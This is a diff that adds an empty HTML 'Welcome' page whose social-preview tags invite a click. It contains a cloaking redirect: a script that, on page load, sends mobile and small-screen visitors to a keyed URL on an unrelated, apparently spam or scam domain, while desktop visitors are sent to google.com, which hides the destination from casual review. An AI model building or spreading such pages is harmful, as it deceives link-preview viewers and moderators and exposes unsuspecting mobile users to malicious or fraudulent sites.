@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Welcome</title>
+<meta property="og:title" content=" " />
+<meta property="og:description" content="Click to view" />
+<meta property="og:image" content="https://www.google.com/share.google?q=Uefb79WVuaoAorNBN"
+/>
+<meta property="og:url" content="https://coral-marigold-cg9rxj.mystrikingly.com/" />
+<meta property="og:type" content="website" />
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+var screenWidth = window.innerWidth;
+if (isMobile || screenWidth <= 768) {
+window.location.href = "https://researchingsweatexit.com/e2sr0mbp98?key=13f6b38e63d9e99e9778277ccf0ff4f7";
+} else {
+window.location.href = "https://www.google.com/";
+}
+});
+</script>
+</head>
+<body>
+</body>
+</html>
